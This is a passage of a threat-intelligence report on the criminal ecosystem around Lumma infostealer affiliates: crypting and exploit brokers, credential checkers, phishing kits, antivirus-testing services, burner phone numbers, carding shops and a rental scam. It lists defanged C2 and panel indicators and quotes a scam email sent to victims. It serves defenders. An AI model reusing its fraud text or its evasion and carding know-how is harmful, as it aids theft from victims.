<div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_12ac5622adb02506fb95aea510b69f499073d27ed.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"1200\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 5</em></strong><em>: HostCay website (Source:</em> <em><a href=\"https://urlscan.io/result/01977d11-1468-7530-9e39-ab54b42b7099\">urlscan.io</a>)</em></div>\n          </div>\n        </div>\n        <p>Lumma affiliates have also been observed leveraging numerous legitimate hosting providers and services, including the file hosting platform MEGA (<em>mega[.]nz</em>), the file and text sharing service Temp[.]sh (<em>temp[.]sh</em>), and the image hosting service ImgBB (<em>imgbb[.]com</em>). They have also made use of various URL shortening services such as <em>shorturl[.]at</em> and <em>free-url-shortener[.]rb[.]gy</em>.</p>\n        <h4>Exploit and Crypting Services</h4>\n        <p>One notable service supporting Lumma operations is run by an actor known as “@cryptexxx.” Rather than being a Lumma affiliate directly, @cryptexxx is the operator of a crypting and exploit service known as Hector (advertised via the domain <em>hector[.]su</em>) that caters to malware distributors, among others (see <strong>Figure 6</strong>). The HTML content of <em>hector[.]su</em> includes meta keywords — such as <code>crypt</code>,<code> exe</code>,<code> exploits</code>,<code> chrome</code>,<code> bypass</code>,<code> lnk</code>,<code> url</code>,<code> xls</code>,<code> xll</code>,<code> doc</code>,<code> docx</code>,<code> pdf</code>,<code> builder</code>,<code> macro</code>, or<code> popup</code> — indicating a broad toolkit for creating malicious payloads across various file formats (from Office macros to Chrome exploits). Forum discussions corroborate that this service provides fully undetectable (FUD) droppers and document exploits for delivering malware. For example, one hacker forum user explicitly directs others to “see URL exploit on <em>hector[.]su</em>” as a resource for a Gmail-attachable, FUD exploit. Such exploits often take the form of weaponized Office files, like malicious Excel add-in files (<code>.XLL</code>) or macro-laced documents, which can embed the Lumma payload and are designed to slip past email scanners and antivirus protections.</p>\n        <p>Recent evidence illustrates how these tools are used in practice. In mid-2025, an underground vendor advertised an updated Office exploit that is “up to date, works in 2025 and attachable on Gmail, plus FUD,” explicitly boasting that it can bypass Gmail’s filters. The same offering also highlights a Windows Defender runtime bypass, with an AV scan report showing 0/26 detections. This means a Lumma affiliate could generate a trojanized file (such as an Excel <code>.xll</code> file or a malicious shortcut/URL file) that delivers the stealer while evading both email gateway scanning and endpoint antivirus protections.</p>\n        <p>By leveraging @cryptexxx’s crypting service and exploit builder, the affiliate essentially outsources the difficult aspects of stealth and delivery. It is a clear example of the cooperative nature of LummaC2 operations: the malware developer provides the infostealer malware, the service operator (@cryptexxx) supplies an obfuscation and exploit toolkit, and the affiliate uses these tools to distribute the payload to victims.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_1e41a0b354e689ebe2db03d2c9e0529206edc5e4b.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"1200\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 6</em></strong><em>: Hector website (Source:</em> <em><a href=\"https://urlscan.io/result/01980dbf-c531-7336-88f2-354307aa640b\">urlscan.io</a>)</em></div>\n          </div>\n        </div>\n        <h4>Email-Linked Services and Tools</h4>\n        <p>Insikt Group observed multiple Lumma affiliates using a range of email and spam-related services, including a credential validation tool known as “EMAIL SOFTWARE 1.4.0.9 cracked by Maksim” and a phishing page creation tool known as “DONUSSEF”, both of which have likely been deployed in at least one confirmed case.</p>\n        <h5>EMAIL SOFTWARE 1.4.0.9 cracked by Maksim</h5>\n        <p>EMAIL SOFTWARE 1.4.0.9 cracked by Maksim is a cracked version of a Windows .NET-based email credential verification tool (see <strong>Figure 7</strong>). It is designed to validate email and password combinations against mail servers using protocols like IMAP and POP3. Users can input large lists of email credentials (often referred to as \"combo lists\") to check which combinations are valid. The tool also <a href=\"https://pro.urlscan.io/result/01980f1a-e26f-772c-acd5-5462d5591743\">allows</a> users to search for specific keywords within email content. The tool is distributed as a password-protected <code>.rar</code> archive on various hacking and cracking forums (such as DemonForums or XReactor), with users reporting prices of up to $250 on underground marketplaces.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_19f74fdb6628756b01d6a3be60a6c5d348409ede9.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"1200\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 7</em></strong><em>: EMAIL SOFTWARE 1.4.0.9 cracked by Maksim advertised on forum[.]cnsec[.]org (Source:</em> <em><a href=\"https://urlscan.io/result/01980f1a-e26f-772c-acd5-5462d5591743\">urlscan.io</a>)</em></div>\n          </div>\n        </div>\n        <p>The tool features a user interface with several configuration options, including a status overview of processed email addresses, a control panel to start or stop validation, and proxy management capabilities, among other functionalities (see <strong>Figure 8</strong>).</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_1fe77bd5713a62927a8160bdfaf8e196d0f90f64b.png?width=750&amp;format=png&amp;optimize=medium\" width=\"780\" height=\"596\" />\n            </div>\n          </div>\n          <div>\n            <div>\n              <p><strong><em>Figure 8</em></strong><em>: Graphical user interface (GUI) of EMAIL SOFTWARE 1.4.0.9 cracked by Maksim</em></p>\n              <p><em>(Source: Recorded Future)</em></p>\n            </div>\n          </div>\n        </div>\n        <p>Insikt Group assesses that the Lumma affiliate blackowl23 has used or continues to use the tool to validate stolen credentials, which are then leveraged in the follow-on real estate scam detailed in the section <a href=\"#blackowl23s-involvement-in-real-estate-scam\">blackowl23’s Involvement in Real Estate Scam</a>, among other scams.

In the demo, it was shown creating only PayPal phishing pages (see <strong>Figure 10</strong>). Due to the unavailability of the actual HTML pages, Insikt Group was unable to assess their effectiveness or determine whether they have appeared in any known campaigns.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_1b05606f3d26012003b4511f2ca48399daa1cbfaa.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1290\" height=\"802\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 10</em></strong><em>: PayPal phishing page generated by DONUSSEF (Source: Recorded Future)</em></div>\n          </div>\n        </div>\n        <p>Through further investigation, Insikt Group <a href=\"https://www.youtube.com/@donussef\">identified</a> a YouTube channel likely associated with the suspected creator of DONUSSEF. The actor used the channel to demonstrate at least two additional tools: one <a href=\"https://www.youtube.com/watch?v=eKGYS5gqOI4\">marketed</a> as an email sender with a 100% inbox delivery rate, and another for SMS spamming (<a href=\"https://www.youtube.com/watch?v=9UrQ8DgwDBM\">referred</a> to as “<code>ULTRA-checker.py</code>” in the video). Both videos were uploaded on December 18, 2022, from a device using French-language settings. In one of the demo videos, the actor used and accessed two email accounts, <em>ussefescobar@seznam[.]cz</em> and <em>ussefakkar@outlook[.]com</em>, which are believed to be linked to the actor.</p>\n        <p>The <code>ULTRA-checker.py</code> tool includes references to two Telegram channels: @donussef and @rdpvendor. At least one of these accounts appears to be active in Telegram communities associated with spam-related tools (see <strong>Figure 11</strong>). Insikt Group found no additional links between the suspected creator of DONUSSEF and blackowl23.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_15ff4ef7cedb3fc035bb76ed4e5573e7425261e10.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1246\" height=\"362\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 11</em></strong><em>: @donussef advertising tooling on Telegram (Source: Recorded Future)</em></div>\n          </div>\n        </div>\n        <h5>Other Email Sender and Lead Generation Services</h5>\n        <p>Insikt Group identified several other, often legitimate email-related services used by Lumma affiliates for multiple purposes, including Joz Data (<em>jozdata[.]com</em>), Mailchimp (<em>mailchimp[.]com</em>), Spamir (<em>spamir[.]fr</em>), and Mandrill (<em>mandrillapp[.]com</em>), among others. Joz Data provides validated, segmented email lists for marketing and lead generation. Mailchimp is a legitimate platform for designing and managing email campaigns. Spamir <a href=\"https://pro.urlscan.io/result/55f27eb5-b9fa-4c56-aab1-93cad0379dbb\">offers</a> tools for bulk email and SMS delivery, often linked to spam or phishing activity despite being presented as a testing toolkit. Mandrill, a paid add-on to Mailchimp, is a transactional email API used to send one-to-one, event-triggered messages such as password resets and order confirmations via SMTP or API.</p>\n        <h4>AVCheck and Alternatives</h4>\n        <p>Like many threat actors deploying malware or related infrastructure, Lumma affiliates actively seek tools to test detection beyond standard sandbox environments. Over the past twelve months, Insikt Group observed multiple affiliates using at least two such services: AVCheck (<em>avcheck[.]net</em>), which was <a href=\"https://therecord.media/international-operation-takes-down-cryptor\">seized</a> by law enforcement in May 2025; and, more recently, KleenScan (<em>kleenscan[.]com</em>). There were also signs that at least one affiliate used <em>avscan[.]net</em>, although its presence and nature could not be confirmed at the time of analysis, as the domain <a href=\"https://urlscan.io/result/019811bc-d4b7-7636-b6b9-298b027cd6d4\">appeared</a> to be listed for sale.</p>\n        <p>KleenScan is an alternative malware-scanning service frequently used by and <a href=\"https://www.esentire.com/blog/operation-endgame-disrupts-avcheck-forces-threat-actors-to-seek-alternatives\">marketed</a> to cybercriminals to test malicious files, URLs, and domains against multiple antivirus engines (see <strong>Figure 12</strong>). It offers a user interface, API, and command-line client, and even a Telegram bot (@kleenscanofficialbot) for uploads and real-time or runtime scans, all while explicitly promising a \"No Distribution\" policy so that submitted samples will not be shared with antivirus vendors. Although Insikt Group observed Lumma affiliates using KleenScan prior to AVCheck’s seizure in May 2025, public reporting <a href=\"https://www.esentire.com/blog/operation-endgame-disrupts-avcheck-forces-threat-actors-to-seek-alternatives\">indicates</a> that cybercriminals have increasingly turned to platforms like KleenScan as an alternative due to the seizure. Notably, KleenScan advertises <em>hector[.]su</em> (see <strong>Figure 12</strong>), an exploit broker further detailed in the section <a href=\"#exploit-and-crypting-services\">Exploit and Crypting Services</a>.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_1b4750622ab8a9e704c0c25d86a10dc2b09776539.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"1200\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 12</em></strong><em>: KleenScan website (Source:</em> <em><a href=\"https://urlscan.io/result/0197f8be-2b86-754f-bf58-e9b1ba1a9617\">urlscan.io</a>)</em></div>\n          </div>\n        </div>\n        <h4>Phone and SMS Services</h4>\n        <p>Lumma affiliates heavily abuse virtual phone and SMS services (see <strong>Table 4</strong>) such as OnlineSim, SMS-Activate, and Zadarma. These platforms provide throwaway phone numbers for SMS or voice verification, which the threat actors use to bypass OTP-based security and create fake accounts without using personal identifiers. Lumma affiliates can automatically receive 2FA codes or activation PINs on virtual numbers, allowing them to register malware distribution sites, cloud drives, or messaging accounts without exposing their real phone lines. This identity obfuscation is crucial in the Lumma ecosystem, as it frustrates attribution and takedown efforts by making infrastructure ownership seem transient.</p>\n        <p>In practice, using these services for OTP bypass and fake account generation helps Lumma crews widen their attack surface. Disposable SMS numbers let attackers circumvent SMS-based two-factor authentication by redirecting one-time passcodes to attacker-controlled inboxes. This means that even if a stolen account is protected by SMS 2FA, Lumma affiliates can try to reroute the OTP to a virtual number they control, effectively nullifying the protection. Services like Zadarma (a VoIP provider) further enable criminals to receive calls or texts on virtual lines, or even perform spoofed voice calls as part of OTP interception bots and vishing schemes. Within the Lumma affiliate program, guides and community chatter encourage the use of these tools for operational security, from registering throwaway email and Telegram accounts to setting up C2 panels or scam payment accounts.</p>\n        <div>\n          <div>\n            <div><strong>Service Name</strong></div>\n            <div><strong>Domain</strong></div>\n            <div><strong>Notes</strong></div>\n          </div>\n          <div>\n            <div>OnlineSim</div>\n            <div>onlinesim[.]io</div>\n            <div>Burner eSim Provider</div>\n          </div>\n          <div>\n            <div>SMS-Activate</div>\n            <div>sms-activate[.]org</div>\n            <div>Burner eSim Provider</div>\n          </div>\n          <div>\n            <div>SMS-Activate</div>\n            <div>sms-activate[.]io</div>\n            <div>Burner eSim Provider</div>\n          </div>\n          <div>\n            <div>Zadarma</div>\n            <div>zadarma[.]com</div>\n            <div>VoIP Service</div>\n          </div>\n        </div>\n        <p><strong><em>Table 4</em></strong><em>: Phone and SMS-linked services used by Lumma affiliates (Source: Recorded Future)</em></p>\n        <h4>Messaging Platforms</h4>\n        <p>Lumma affiliates integrate multiple secure messaging and information-sharing tools into their daily workflows to enhance operational security, maintain anonymity, and minimize digital footprints. Affiliates commonly use uTox, a decentralized peer-to-peer messaging client employing end-to-end encryption via the Tox protocol. This tool facilitates persistent, secure communications, supporting text, voice, and video messaging, and is frequently combined with Tor proxies to conceal affiliate identities and avoid central server dependencies.</p>\n        <p>Mobile affiliates within the Lumma ecosystem prefer secure XMPP-based Android applications like Xabber and <em>c0nnect[.]pro</em>. Both apps offer encrypted communications via off-the-record encryption, multi-account management, and compatibility with private, controlled XMPP servers, making them ideal for discrete coordination while on the move. Affiliates often configure these applications to run in tandem with Tor proxies, further obfuscating metadata and reducing digital exposure.</p>\n        <p>For scenarios requiring transmission of ephemeral, sensitive information, such as credentials, passwords, or instructions, Lumma affiliates frequently rely on Privnote, a web-based service that generates encrypted notes that self-destruct after being read once. This capability significantly reduces the affiliate’s potential forensic footprint by leaving no persistent records and enables secure, rapid exchanges of operational details.</p>\n        <p>Collectively, these tools form a layered communication architecture employed by Lumma affiliates, effectively balancing persistent communications, mobile flexibility, and ephemeral secure exchanges to minimize risks and enhance stealth.</p>\n        <h4>Social Media Optimization</h4>\n        <p>In at least one case, Insikt Group observed a Lumma affiliate leveraging the service Bosslike (<em>bosslike[.]ru</em>), which claims to offer free and rapid boosts for likes on platforms such as Instagram, VK, and TikTok (see <strong>Figure 13</strong>), likely in support of scam-related activities.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_1e5a4b28cf8cb515b048811dd60d31a8a04e11d19.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"1200\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 13</em></strong><em>: Bosslike website (Source:</em> <em><a href=\"https://urlscan.io/result/0196396a-4d12-74aa-baed-f578603fcf7a\">urlscan.io</a>)</em></div>\n          </div>\n        </div>\n        <h3>Affiliates’ Embedding in the Cybercriminal Ecosystem</h3>\n        <h4>Forum Involvement</h4>\n        <p>Lumma’s affiliate ecosystem thrives on underground forums that act as hubs for collaboration, resources, and marketplaces. Russian-language cybercrime forums like XSS and Exploit serve as launchpads for Lumma’s MaaS, and they are where the stealer was initially <a href=\"https://www.cloudflare.com/threat-intelligence/research/report/cloudflare-participates-in-joint-operation-to-disrupt-lumma-stealer/#:~:text=Lumma%20Stealer%20was%20first%20observed,to%20the%20current%20disruption%20effort\">advertised</a> and vetted by the community. These forums attract technically adept threat actors and lend credibility to new malware offerings through reputation systems and moderator oversight. Affiliates frequent them not only to obtain Lumma builds but also to engage with trusted escrow and arbitration services, ensuring safer transactions when purchasing tools or settling disputes with partners. The established trust on forums like Exploit and XSS provides a reliable environment for affiliates to do business, from renting servers to resolving conflicts, under the watch of experienced moderators.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_1db2f45198f41f4390ee29bf9219aca95d175fb6e.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"906\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 14:</em></strong> <em>LummaC2 administrator (image text machine-translated from Russian) (Source: Exploit Forum)</em></div>\n          </div>\n        </div>\n        <p>At the same time, mass-market cybercrime communities such as LolzTeam (<em>zelenka[.]guru</em>) have become a hotbed for <a href=\"https://www.cybercrimediaries.com/post/russian-language-cybercriminal-forums-analyzing-the-most-active-and-renowned-communities#:~:text=Our%20observations%20lead%20us%20to,and%20offering%20to%20educate%20beginners\">recruiting</a> and training the foot soldiers of Lumma’s operations. These more accessible forums host dedicated sections for “traffers,” threat actors who specialize in spreading infostealer malware, and are actively used to assemble affiliate teams and educate newcomers. On LolzTeam, for example, seasoned criminals advertise infostealer affiliate programs that provide novices with everything needed to start distributing malware. In <a href=\"https://g0njxa.medium.com/profiling-traffic-cerberus-ex-amnesia-3758faba4385\">one case</a>, a team on LolzTeam offered free crypted Lumma builds and even SEO support to new recruits, taking a percentage of profits from stolen cryptocurrency assets. This low barrier to entry, combined with forum-posted tutorials on fraud techniques and operational security, turns platforms like LolzTeam into a workforce pool for infostealer distribution. The forums’ community-driven vetting, including rules against targeting certain regions and public feedback on schemes, further helps affiliates learn effective and “acceptable” tactics. Common fraud methodologies are frequently discussed and popularized on these boards, giving Lumma affiliates insight into monetization tricks and victim manipulation strategies.</p>\n        <p>Perhaps most critically, these underground forums provide ready-made marketplaces and services that Lumma affiliates leverage to monetize stolen data and optimize their campaigns. Infostealer logs are in high demand, and forums link affiliates to bustling marketplaces where this data is bought and sold. Russian Market (<em>rm1[.]to</em>), for example, is an automated shop accessible via forum circles that has been <a href=\"https://reliaquest.com/blog/infostealer-pipeline-stolen-credential-attacks-russian-marketplace/?utm_source=twitter.com/thewebvy#:~:text=credentials%20on%20the%20notorious%20automated,vending%20cart%20site%20Russian%20Market\">described</a> as “the Amazon of stolen credentials” for its massive inventory and one-click purchase convenience. By late 2024, Lumma had become the dominant source of credentials on Russian Market, <a href=\"https://reliaquest.com/blog/infostealer-pipeline-stolen-credential-attacks-russian-marketplace/?utm_source=twitter.com/thewebvy#:~:text=credentials%20on%20the%20notorious%20automated,vending%20cart%20site%20Russian%20Market\">accounting</a> for roughly 92% of stolen log listings, underscoring how extensively Lumma affiliates dump their haul on such platforms for profit. Other venues like LolzTeam’s own marketplace and <em>xleet[.]pw</em> similarly include sections for infostealer logs, compromised accounts, and digital goods, allowing affiliates to quickly sell data from Lumma infections to the highest bidder. Beyond data sales, forum marketplaces connect Lumma affiliates to initial access brokers and financial fraud services that help convert stolen information into cash. Affiliates can find buyers for enterprise login credentials or enlist money laundering and cash-out services advertised across these forums.</p>\n        <p>Underground forums double as one-stop shops for the technical and operational support that Lumma affiliates need. Dedicated <a href=\"https://medium.com/s2wblog/lumma-stealer-targets-youtubers-via-spear-phishing-email-ade740d486f7\">threads</a> run by the Lumma developers or peer community members offer technical assistance, update announcements, and troubleshooting advice in real time. This means an affiliate can turn to forum communities for help with builder configuration, antivirus evasion tips, or to share intelligence on law enforcement takedowns. The forums also host a range of malware-adjacent services crucial to running stealthy campaigns. Providers of bulletproof hosting, VPNs, and traffic distribution congregate on all major forums. The same service providers frequently advertise on multiple sites, which makes it easy for affiliates to obtain resilient servers and web domains to host Lumma malware. Crypting services are equally accessible; for instance, the popular Cassandra crypter and others are promoted in forum marketplaces, enabling affiliates to continuously encrypt and repackage Lumma payloads to evade antivirus detection.</p>\n        <p>There is a rich ecosystem of offerings, such as exploit kits, fake document templates, spambot rentals, and credential checkers, which affiliates can source from these communities to enhance their operations. Together, these forums provide Lumma affiliates with a comprehensive suite of tools that have been vetted by the community. This practical and operational value is why Lumma’s affiliate network remains deeply embedded in underground forums: they provide not only the means to deploy and hide the malware, but also the mechanisms to cash in on its outputs, all within a semi-structured community that enforces trust among thieves.</p>\n        <h4>Carding Shops</h4>\n        <p>Lumma Stealer affiliates turn to specialized carding shops like <em>b1ackstash[.]cc</em>, <em>stashpatrick[.]io</em>, BriansClub (see <strong>Figure 15</strong>) (<em>bclub[.]cm</em> and <em>briansclub[.]cm</em>), and <em>binsoficial666[.]activo[.]mx</em> to efficiently monetize the financial data they’ve stolen. Insikt Group notes that these sources vary widely in credibility; shops like BriansClub are considered authoritative within the payment fraud ecosystem, while <em>binsoficial666[.]activo[.]mx</em> has a very poor reputation. Unlike general cybercrime boards, carding websites are dedicated to trading payment data and attract a built-in customer base of fraudsters looking for credit card numbers, bank logins, and personal info. Lumma affiliates capitalize on this demand by selling freshly obtained card records and “fullz” in bulk, often earning a percentage for each sale through the forum’s escrow or shop system. In essence, carding platforms let Lumma affiliates quickly turn stolen card data into profit, with high-volume outlets like BriansClub historically trafficking millions of compromised cards supplied by malware affiliates.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_1d27f63dc4b78c138192c435b85674cee940042ed.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1414\" height=\"788\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 15:</em></strong> <em>Landing page for BriansClub (Source: BriansClub)</em></div>\n          </div>\n        </div>\n        <p>Beyond sales, carding forums offer operational support for fraud that broader hacking forums do not. Lumma affiliates frequent these communities to learn and collaborate on card-not-present (CNP) fraud using stolen card credentials to buy goods or launder money online. The forums host vetted tutorials for abusing e-commerce sites and payment processors, helping thieves bypass anti-fraud measures. Members also advertise criminal services such as providing “drop” addresses (safe delivery points for goods bought with stolen cards) or converting illicit purchases into cash. Additionally, these forums supply validation tools and services critical to fraud operations. Lumma affiliates can purchase or access credit card checkers that automatically test which cards from their stealer logs remain valid and have credit available, ensuring they only spend time on live cards. They might also acquire Bank Identification Number (BIN) lists and other utilities, using the community’s pooled resources to maximize successful transactions. Carding sites enable Lumma affiliates to offload infostealer loot in bulk, complementing sales on broader crime forums. A single Lumma infection yields an expansive log of credentials, cookies, system data, and often multiple financial accounts; parsing and individually selling each asset can be labor-intensive. Carding marketplaces or associated breach data shops let affiliates resell entire stealer logs or specific datasets to other criminals who specialize in exploiting them. For example, high-value logs from Lumma, containing not just cards but bank account passwords or cryptocurrency wallet keys, are often posted on underground markets or offered via automated bot vendors shortly after exfiltration. This practice allows Lumma affiliates to monetize stolen information at scale: they can quickly sell bundles of fresh logs to brokers or fraud rings while focusing their own efforts on new infections. In tandem with general hacking forums, these carding forums provide the ecosystem for cashing out Lumma’s results. They offer a one-stop underground economy where affiliates convert stolen data into money through direct sales of CVVs and “fullz,” the provision of guidance and tools for fraudulent transactions, and the bulk resale of stolen logs. This significantly enhances both the profitability and practicality of Lumma operations.</p>\n        <h4>Use of Additional Infostealers</h4>\n        <p>Insikt Group observed several Lumma affiliates leveraging other infostealers alongside Lumma.</p>\n        <h5>Meduza Stealer, Vidar, and CraxsRAT Used by Likely Mexico-Based Lumma Affiliate</h5>\n        <p>The affiliate linked to Lumma build ID re0gvc, a likely Mexico-based threat actor operating under multiple aliases across various forums, was observed using Meduza Stealer infrastructure tied to IP address <em>195[.]133[.]18[.]15</em>. Like Lumma, Meduza Stealer is a Windows-based MaaS infostealer, designed to extract credentials, browser data, and crypto wallets while evading detection through anti-analysis and geo-filtering techniques.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_1fc9ce08a94a9aadc2929d15f0d26e439cfe92201.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"1200\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 16</em></strong><em>: Meduza Stealer panel on hxxp://195[.]133[.]18[.]15/auth/login (Source:</em> <em><a href=\"https://urlscan.io/result/09dbd3e5-a1b2-4a69-ba69-48fc91111817\">urlscan.io</a>)</em></div>\n          </div>\n        </div>\n        <p>Insikt Group also identified high-confidence indicators that the same threat actor used Vidar, a Windows-based infostealer, along with medium-confidence evidence suggesting the use of CraxsRAT, an Android-based RAT, based on Telegram profile images likely tied to the affiliate (see <strong>Figure 17</strong>). While this indicates this affiliate may have also targeted mobile devices, Insikt Group found no associated samples, infrastructure, or campaigns to confirm this activity.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_15f6ac4a2481b1afe243529928308667acd1e8196.png?width=750&amp;format=png&amp;optimize=medium\" width=\"591\" height=\"1280\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 17</em></strong><em>: Telegram account linked to Kingping_Mx (Source: Recorded Future)</em></div>\n          </div>\n        </div>\n        <h5>Stealc Used by Lumma Affiliate suffergrime</h5>\n        <p>Another affiliate linked to Lumma build IDs test222 and eLMNFu, known as “suffergrime” on various forums and operating under multiple other aliases, including duckfuck, cryptplease, ultracool2201, borodach, and dedo4ek, appears to have used StealC alongside Lumma. Stealc is a modular, evasive information stealer written in C and distributed as an MaaS. More specifically, suffergrime has been observed interacting with the Stealc management panel on the URL <em>hxxp://94[.]232[.]249[.]208/6a6fe9d70500fe64/main.php</em>. Insikt Group assesses that the affiliate is likely a Spanish speaker, with indications suggesting a possible origin in South America.</p>\n        <h5>worldmix10k’s Interest in Wallet and Vilsa Stealer</h5>\n        <p>In addition to the cases above, Insikt Group observed a Lumma affiliate associated with build ID 1dacrp and likely known as “worldmix10k” expressing interest in two additional stealers: a “Wallet Stealer” previously hosted on a GitHub repository named “poopybuthoop”, and Vilsa Stealer, an infostealer that had been publicly <a href=\"https://www.cyfirma.com/research/vilsa-stealer/\">reported</a> on earlier. Although the GitHub repository was no longer accessible at the time of analysis, a historical snapshot was preserved by Ecosyste.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_11ba019fddd4e2ebff5c9c5b9eae1282db115f67c.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1434\" height=\"690\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 18</em></strong><em>: Repository linked to poopybuthoop (Source: Ecosyste)</em></div>\n          </div>\n        </div>\n        <p>Notably, a search for the string “worldmix10k” led Insikt Group to a Lumma sample with the build ID “1dacRP--worldmix10k”, linked to the same affiliate. This sample used <em>techmindzs[.]live</em> and <em>earthsymphzony[.]today</em> as its C2 domains, as well as a SteamCommunity URL, <em>hxxps://steamcommunity[.]com/profiles/76561199822375128</em>, for dead drop resolving. Insikt Group could not identify the exact infection chains linked to the sample.</p>\n        <h4>Involvement in Other Scams</h4>\n        <p>Analysis of multiple Lumma affiliates over the last twelve months revealed that many are not only using multiple infostealers concurrently, as outlined in the section <a href=\"#use-of-additional-infostealers\">Use of Additional Infostealers</a>, but are also likely involved in a variety of distinct scam operations. One of these scams, linked to the Lumma affiliate known as blackowl23, drew particular attention from Insikt Group and is explored in greater detail below.</p>\n        <h5>blackowl23’s Involvement in Real Estate Scam</h5>\n        <p>Insikt Group uncovered evidence indicating that blackowl23 has been involved in a real estate scam in which rental listings, likely both actor-created and compromised, on platforms like the German website WG-Gesucht were used to deceive victims into making payments before apartment viewings. As part of this scheme, blackowl23 has used the email addresses <em>immo-total[@]outlook[.]com</em> and <em>mwimport[@]outlook[.]de</em> (see <strong>Figure 19</strong>).</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_1c3c421abc4ced297a0201ce3196999a7afecc06a.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"979\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 19</em></strong><em>: WG-Gesucht advertisements showing up in a Google search (Source: Recorded Future)</em></div>\n          </div>\n        </div>\n        <p>More specifically, the affiliate claimed to have had “bad experiences in the past with people wanting to rent the property,” stating that when they “got to the property, there was no one there,” which resulted in “cancelled business appointments, wasting time and money.” Using this as justification, they asked victims to make payments via Booking.com, asserting that the process was secure and that victims would be refunded if they were dissatisfied with the apartment (see <strong>Figure 20</strong>). Notably, the same URL path (<code>property-aid-63785823-label-gen-832513841233</code>) <a href=\"https://www.fortian.com.au/blog/unmasking-sophisticated-marketplace-scams.html\">observed</a> in this activity was also seen in the final-stage URL of a rental scam campaign reported by Fortian in 2024. In that instance, victims were <a href=\"https://www.fortian.com.au/blog/unmasking-sophisticated-marketplace-scams.html\">deceived</a> into reserving accommodations, and the domain used appears to be a typosquatting variant, <em>booking[.]eu-apt-booking[.]homes</em>, hosted via Cloudflare.</p>\n        <div>\n          <div>\n            <div>\n              <pre><code>Hello,\n\nUnfortunately, no, but here attached to this email you have the booking.com link from where you can rent and check the apartment.\n\nAfter we receive the booking.com confirmation that the rent procedure and the payment is completed on the platform, we can arrange the visit or the move-in directly to the apartment.\n\nWe want to let you know that the rent procedure is secured by booking.com and if you don't like the apartment you will receive the money back without any problems directly to your bank account on the same day.\n\nHere is the booking.com link where you can check the apartment and complete the rent procedure:\n\nhxxps://REDACTED/property-aid-63785823-label-gen-832513841233/en/528104900\nLet us know if you have any questions or concerns.\n\nAfter you complete the rent procedure, please send us the confirmation of it.\n</code></pre>\n            </div>\n          </div>\n        </div>\n        <p><strong><em>Figure 20</em></strong><em>: Text sent to the target of a Lumma affiliate (Source: Recorded Future)</em></p>\n        <p>Insikt Group also uncovered supporting evidence that the affiliate employed a similar scheme: claiming to have escrow agents worldwide, sending victims a payment link to secure a reservation, and promising that the funds would be held safely and transferred to “one of [their] available bank accounts.” In this case, Insikt Group was unable to recover the actual payment link.</p>\n        <p>While the affiliate may have created their own accounts on platforms like WG-Gesucht, evidence shows they possess a large number of compromised WG-Gesucht credentials. Insikt Group hypothesizes that at least some of these credentials were stolen through the affiliate’s Lumma infections. In this context, it's important to note that while selling logs is generally lucrative, the value of certain credentials, such as those for platforms like WG-Gesucht, likely comes from their use in follow-on scams rather than direct resale, which may explain why some buyers may show limited interest in them.</p>\n        <h2>Outlook</h2>\n        <p>Insikt Group’s unique investigation into Lumma affiliates uncovered a large infostealing ecosystem enabled by a diverse set of tools and services, including proxies, VPNs, anti-detect browsers, exploit kits, crypting services, and malware detection tools. During the investigation, Insikt Group identified previously unreported tools and demonstrated how affiliates frequently run multiple scams in parallel, such as rental fraud, while leveraging additional infostealers like Vidar, Stealc, and Meduza Stealer, likely to enhance success rates and reduce the impact of detection or law 